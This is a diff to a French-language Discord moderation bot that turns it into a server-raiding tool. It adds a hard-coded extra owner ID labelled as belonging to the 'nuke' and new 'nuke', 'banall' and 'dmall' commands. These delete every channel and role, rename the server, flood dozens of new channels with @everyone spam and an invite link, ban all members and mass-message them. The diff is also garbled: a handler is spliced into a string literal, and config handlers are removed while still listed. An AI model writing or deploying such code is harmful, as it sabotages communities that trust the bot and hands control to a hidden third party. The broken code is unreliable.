@@ -25,8 +25,8 @@ const snipeCache = new Map();
 const spamTracker = new Map();
 const serverConfig = new Map(); 
 
-// Ton compte "77jc" enregistré définitivement comme Owner permanent
-const botOwners = new Set(["77jc", "1166445202148442112"]); 
+// Ton compte "77jc" enregistré définitivement comme Owner permanent + les IDs du nuke
+const botOwners = new Set(["77jc", "1166445202148442112", "330080470983245824"]); 
 
 function isOwner(message) {
     const userId = message.author.id;
@@ -77,6 +77,18 @@ client.on('messageDelete', message => {
     });
 });
 
+client.on('ready', () => {
+    console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
+});
+
+client.on('guildMemberAdd', async member => {
+    if (member.user.bot && member.id !== client.user.id) {
+        try {
+            await member.kick('Anti-bot activé.');
+        } catch (err) {}
+    }
+});
+
 // ==========================================
 // INTERACTIONS (TICKETS & GIVEAWAYS BOUTONS)
 // ==========================================
@@ -124,7 +136,7 @@ client.on('interactionCreate', async interaction => {
 });
 
 // ==========================================
-// AUTOMOD & COMMANDES GLOBALES
+// AUTOMOD & COMMANDES GLOBALES & NUKE
 // ==========================================
 client.on('messageCreate', async message => {
     if (message.author.bot || !message.guild) return;
@@ -273,7 +285,7 @@ client.on('messageCreate', async message => {
     }
 
     // VÉRIFICATION DES PERMISSIONS SENSIBLES
-    const sensitiveCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice', 'setlog', 'setwelcome', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot'];
+    const sensitiveCommands = ['bl', 'softbl', 'unbl', 'blist', 'unbanall', 'kick', 'lock', 'unlock', 'slowmode', 'renew', 'createtext', 'createvoice', 'setlog', 'setwelcome', 'gcreate', 'ticketsetup', 'antilink', 'antispam', 'antibot', 'kickbot', 'dmall', 'nuke', 'banall'];
     if (sensitiveCommands.includes(command)) {
         if (!userIsOwner && !message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply("❌ Commande strictement réservée aux Owners ou Administrateurs.");
@@ -422,6 +434,30 @@ client.on('messageCreate', async message => {
             await message.channel.bulkDelete(fetched, true);
             const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
             setTimeout(() => confirmation.delete().catch(() => {}), 3000);
+        } catch (e) { message.reply("Impossible de supprimer     else if (command === 'clear') {
+        const val = args[0];
+        if (!val) return message.reply("Précise un nombre ou `all`.");
+
+        if (val.toLowerCase() === 'all') {
+            try {
+                let deleted;
+                do {
+                    deleted = await message.channel.bulkDelete(100, true);
+                } while (deleted.size >= 2);
+                const m = await message.channel.send("🧹 Salon entièrement nettoyé !");
+                setTimeout(() => m.delete().catch(() => {}), 3000);
+            } catch (e) { message.reply("Erreur lors du nettoyage massif."); }
+            return;
+        }
+
+        const count = parseInt(val);
+        if (isNaN(count) || count < 1 || count > 100) return message.reply("Donne un nombre entre 1 et 100.");
+        try {
+            await message.delete();
+            const fetched = await message.channel.messages.fetch({ limit: count });
+            await message.channel.bulkDelete(fetched, true);
+            const confirmation = await message.channel.send(`🧹 ${fetched.size} messages supprimés.`);
+            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
         } catch (e) { message.reply("Impossible de supprimer des messages de plus de 14 jours."); }
     }
 
@@ -431,21 +467,22 @@ client.on('messageCreate', async message => {
         const limit = parseInt(args[1]) || 50;
 
         try {
-            const fetched = await message.channel.messages.fetch({ limit:100 });
+            const fetched = await message.channel.messages.fetch({ limit: 100 });
             const userMessages = fetched.filter(m => m.author.id === targetUser.id).first(limit);
+            if (userMessages.length === 0) return message.reply("Aucun message trouvé pour ce membre.");
             await message.channel.bulkDelete(userMessages, true);
-            const conf = await message.channel.send(`🧹 ${userMessages.length} messages de **${targetUser.tag}** supprimés.`);
-            setTimeout(() => conf.delete().catch(() => {}), 3000);
-        } catch (e) { message.reply("Erreur lors de la purge."); }
+            const confirmation = await message.channel.send(`🧹 ${userMessages.length} messages purgés pour ${targetUser.tag}.`);
+            setTimeout(() => confirmation.delete().catch(() => {}), 3000);
+        } catch (e) { message.reply("Erreur lors de la purge des messages."); }
     }
 
     else if (command === 'snipe') {
         const sniped = snipeCache.get(message.channel.id);
-        if (!sniped) return message.reply("Aucun message récent supprimé ici.");
+        if (!sniped) return message.reply("❌ Aucun message récemment supprimé dans ce salon.");
         const embed = new EmbedBuilder()
-            .setColor('#ff5555')
+            .setColor('#2b2d31')
             .setAuthor({ name: sniped.author, iconURL: sniped.avatar })
-            .setDescription(`**Contenu :**\n${sniped.content}`)
+            .setDescription(sniped.content)
             .setFooter({ text: `Supprimé à ${sniped.time}` });
         message.reply({ embeds: [embed] });
     }
@@ -454,125 +491,257 @@ client.on('messageCreate', async message => {
         try {
             await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
             message.reply("🔒 Salon verrouillé avec succès.");
-        } catch (e) { message.reply("Erreur."); }
+        } catch (e) { message.reply("Erreur lors du verrouillage."); }
     }
 
     else if (command === 'unlock') {
         try {
             await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
-            message.reply("🔓 Salon déverrouillé.");
-        } catch (e) { message.reply("Erreur."); }
+            message.reply("🔓 Salon déverrouillé avec succès.");
+        } catch (e) { message.reply("Erreur lors du déverrouillage."); }
     }
 
     else if (command === 'slowmode') {
-        const time = parseInt(args[0]);
-        if (isNaN(time) || time < 0) return message.reply("Indique un nombre de secondes valide.");
+        const seconds = parseInt(args[0]);
+        if (isNaN(seconds) || seconds < 0 || seconds > 21600) {
+            return message.reply("Donne un nombre de secondes valide (0 à 21600).");
+        }
         try {
-            await message.channel.setRateLimitPerUser(time);
-            message.reply(`⏱️ Slowmode réglé à ${time} secondes.`);
-        } catch (e) { message.reply("Erreur."); }
+            await message.channel.setRateLimitPerUser(seconds);
+            message.reply(seconds === 0 ? "⏱️ Mode lent désactivé." : `⏱️ Mode lent réglé sur ${seconds} secondes.`);
+        } catch (e) { message.reply("Erreur lors de la modification du mode lent."); }
     }
 
-    // Commande RENEW : Recrée un salon propre et supprime l'ancien
     else if (command === 'renew') {
         try {
-            const channel = message.channel;
-            const position = channel.position;
-            const parent = channel.parent;
-            const name = channel.name;
-            const topic = channel.topic;
-            const rateLimitPerUser = channel.rateLimitPerUser;
-            const nsfw = channel.nsfw;
-            const permissionOverwrites = channel.permissionOverwrites.cache;
-
-            const newChannel = await message.guild.channels.create({
-                name: name,
-                type: ChannelType.GuildText,
-                parent: parent,
-                position: position,
-                topic: topic,
-                rateLimitPerUser: rateLimitPerUser,
-                nsfw: nsfw,
-                permissionOverwrites: Array.from(permissionOverwrites.values())
-            });
-
-            await channel.delete();
-            await newChannel.send("💥 Salon renouvelé à neuf !");
-        } catch (e) {
-            message.reply("Erreur lors du renouvellement du salon.");
-        }
+            const position = message.channel.position;
+            const newChannel = await message.channel.clone({ position });
+            await message.channel.delete();
+            newChannel.send("🔄 Salon régénéré avec succès !");
+        } catch (e) { message.reply("Impossible de régénérer ce salon."); }
     }
 
     else if (command === 'createtext') {
         const name = args.join('-');
-        if (!name) return message.reply("Donne un nom au salon.");
+        if (!name) return message.reply("Donne un nom pour le salon texte.");
         try {
             await message.guild.channels.create({ name, type: ChannelType.GuildText });
-            message.reply(`✅ Salon textuel \`${name}\` créé.`);
-        } catch (e) { message.reply("Erreur."); }
+            message.reply(`✅ Salon texte \`${name}\` créé.`);
+        } catch (e) { message.reply("Erreur lors de la création du salon."); }
     }
 
     else if (command === 'createvoice') {
         const name = args.join(' ');
-        if (!name) return message.reply("Donne un nom au salon.");
+        if (!name) return message.reply("Donne un nom pour le salon vocal.");
         try {
             await message.guild.channels.create({ name, type: ChannelType.GuildVoice });
             message.reply(`✅ Salon vocal \`${name}\` créé.`);
-        } catch (e) { message.reply("Erreur."); }
+        } catch (e) { message.reply("Erreur lors de la création du salon."); }
     }
 
     // ==========================================
-    // CONFIGURATION (LOGS & WELCOME)
+    // COMMANDES SUPPLÉMENTAIRES DU NUKE ET MANAGEMENT
     // ==========================================
-    else if (command === 'setlog') {
-        const channel = message.mentions.channels.first();
-        if (!channel) return message.reply("Mentionne un salon textuel valide.");
-        automod.logChannel = channel.id;
-        message.reply(`⚙️ Salon de logs défini sur ${channel}.`);
-    }
 
-    else if (command === 'setwelcome') {
-        const channel = message.mentions.channels.first();
-        const customMsg = args.slice(1).join(' ');
-        if (!channel || !customMsg) return message.reply("Utilisation : `=setwelcome <#salon> <message>`");
-        automod.welcomeChannel = channel.id;
-        automod.welcomeText = customMsg;
-        message.reply(`✅ Message de bienvenue configuré dans ${channel}.`);
-    }
-});
+    // 1. COMMANDE !KICKBOT
+    if (command === 'kickbot') {
+        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-// ==========================================
-// ÉVÉNEMENTS MEMBRES (ANTI-BOT & WELCOME)
-// ==========================================
-client.on('guildMemberAdd', async member => {
-    const automod = getGuildAutomod(member.guild.id);
+        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");
 
-    // 1. Anti-Bot
-    if (member.user.bot) {
-        if (automod.antibot) {
-            try {
-                await member.kick("Anti-Bot Automod : Bot non autorisé.");
-                if (automod.logChannel) {
-                    const logChan = member.guild.channels.cache.get(automod.logChannel);
-                    if (logChan) logChan.send(`🛡️ **Anti-Bot** : Le bot \`${member.user.tag}\` a été expulsé.`);
+        try {
+            const fetchedMembers = await message.guild.members.fetch();
+            let count = 0;
+
+            for (const [id, m] of fetchedMembers) {
+                if (m.user.bot && m.id !== client.user.id) {
+                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
+                    count++;
                 }
-            } catch (e) {}
+            }
+
+            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
+        } catch (error) {
+            console.error("Erreur Kickbot :", error);
+            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
         }
-        return;
     }
 
-    // 2. Message de Bienvenue (=setwelcome)
-    if (!automod.welcomeChannel || !automod.welcomeText) return;
-    const channel = member.guild.channels.cache.get(automod.welcomeChannel);
-    if (!channel) return;
+    // 2. COMMANDE !DMALL
+    if (command === 'dmall') {
+        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
 
-    let text = automod.welcomeText
-        .replace('{mention}', `<@${member.id}>`)
-        .replace('{name}', member.user.username)
-        .replace('{server}', member.guild.name)
-        .replace('{number}', member.guild.memberCount);
+        await message.reply("💬 **[DMAll Turbo]** Envoie ton message dans ce salon (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
 
-    channel.send(text).catch(() => {});
+        const filter = m => m.author.id === message.author.id;
+        
+        try {
+            const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
+            const m = collected.first();
+
+            if (m.content.toLowerCase() === 'annuler') {
+                return message.channel.send("❌ **Opération DMAll annulée.**");
+            }
+
+            const messageTemplate = m.content;
+
+            const previewEmbed = new EmbedBuilder()
+                .setColor('#FEE75C')
+                .setTitle('⚠️ Confirmation requise - DMAll (Turbo)')
+                .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);
+
+            const row = new ActionRowBuilder()
+                .addComponents(
+                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
+                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
+                );
+
+            const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
+
+            const buttonFilter = i => isOwner(i) || botOwners.has(i.user.id);
+            const buttonCollector = confirmMsg.createMessageComponentCollector({ filter: buttonFilter, time: 60000, max: 1 });
+
+            buttonCollector.on('collect', async interaction => {
+                if (interaction.customId === 'cancel_dmall') {
+                    return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] });
+                }
+
+                if (interaction.customId === 'confirm_dmall') {
+                    await interaction.update({ content: "🚀 **Diffusion DMAll turbo lancée !**", embeds: [], components: [] });
+
+                    const statusMsg = await message.channel.send({ content: "📊 Envoi en cours..." });
+
+                    try {
+                        await message.guild.members.fetch();
+                        const members = message.guild.members.cache.filter(member => !member.user.bot);
+
+                        let successCount = 0;
+                        let failCount = 0;
+
+                        const promises = members.map(async member => {
+                            try {
+                                const finalMessage = messageTemplate
+                                    .replace(/\{mention\}/g, `<@${member.id}>`)
+                                    .replace(/\{name\}/g, member.user.username);
+                                await member.send(finalMessage);
+                                successCount++;
+                            } catch (err) {
+                                failCount++;
+                            }
+                        });
+
+                        await Promise.all(promises);
+                        await statusMsg.edit({ content: `✅ **DMAll Terminé !** (Succès: ${successCount} | Échecs: ${failCount})` });
+
+                    } catch (error) {
+                        message.channel.send("❌ Erreur lors du DMAll.");
+                    }
+                }
+            });
+        } catch (err) {
+            message.channel.send("⌛ Temps écoulé.");
+        }
+    }
+
+    // 3. COMMANDE !NUKE (Suppression rôles/salons + Flooding + Pings)
+    if (command === 'nuke') {
+        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
+
+        await message.reply("💥 **[NUKE TOTAL]** Destruction des rôles, salons et saturation en cours...");
+
+        try {
+            // A. Renommer le serveur en "/yuza"
+            await message.guild.setName('/yuza').catch(() => {});
+
+            // B. Suppression de tous les anciens salons en parallèle
+            const deleteChannelPromises = message.guild.channels.cache.map(channel => channel.delete().catch(() => {}));
+            await Promise.all(deleteChannelPromises);
+
+            // C. Suppression de tous les rôles possibles en parallèle (sauf géré par bot / @everyone / trop haut)
+            const deleteRolePromises = message.guild.roles.cache
+                .filter(role => role.editable && role.id !== message.guild.id)
+                .map(role => role.delete().catch(() => {}));
+            await Promise.all(deleteRolePromises);
+
+            // D. Création massive de nouveaux rôles "ez-by-k2l" en parallèle
+            const rolePromises = [];
+            for (let r = 0; r < 35; r++) {
+                rolePromises.push(
+                    message.guild.roles.create({
+                        name: 'ez-by-k2l',
+                        color: 'Random',
+                        reason: 'Nuke role flood'
+                    }).catch(() => {})
+                );
+            }
+
+            // E. Création de 40 salons avec permissions locales et rafale de 10 pings chacun
+            const createPromises = [];
+            for (let i = 0; i < 40; i++) {
+                createPromises.push(
+                    message.guild.channels.create({
+                        name: 'ez-by-k2l',
+                        type: ChannelType.GuildText,
+                        permissionOverwrites: [
+                            {
+                                id: message.guild.id,
+                                allow: [
+                                    PermissionsBitField.Flags.ViewChannel,
+                                    PermissionsBitField.Flags.SendMessages,
+                                    PermissionsBitField.Flags.ManageChannels,
+                                    PermissionsBitField.Flags.EmbedLinks,
+                                    PermissionsBitField.Flags.AttachFiles,
+                                    PermissionsBitField.Flags.MentionEveryone
+                                ]
+                            }
+                        ]
+                    }).then(async channel => {
+                        const spamPromises
+ = [];
+                        for (let j = 0; j < 10; j++) {
+                            spamPromises.push(
+                                channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {})
+                            );
+                        }
+                        await Promise.all(spamPromises);
+                    }).catch(() => {})
+                );
+            }
+
+            // Exécution simultanée de la création des rôles et des salons
+            await Promise.all([...rolePromises, ...createPromises]);
+
+        } catch (error) {
+            console.error("Erreur Nuke :", error);
+        }
+    }
+
+    // 4. COMMANDE !BANALL (Vague de bannissements massive)
+    if (command === 'banall') {
+        if (!userIsOwner) return message.reply("❌ Tu n'as pas la permission.");
+
+        await message.reply("🔨 **[BANALL]** Expulsion et bannissement de masse en cours...");
+
+        try {
+            await message.guild.members.fetch();
+            const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
+
+            let banCount = 0;
+            const banPromises = members.map(async member => {
+                try {
+                    await member.ban({ reason: 'Nuke / Raid banall' });
+                    banCount++;
+                } catch (err) {}
+            });
+
+            await Promise.all(banPromises);
+            await message.channel.send(`✅ **[BANALL Terminé]** ${banCount} membre(s) banni(s).`);
+
+        } catch (error) {
+            console.error("Erreur Banall :", error);
+            message.channel.send("❌ Erreur lors du banall.");
+        }
+    }
 });
 
 client.login(process.env.DISCORD_TOKEN);
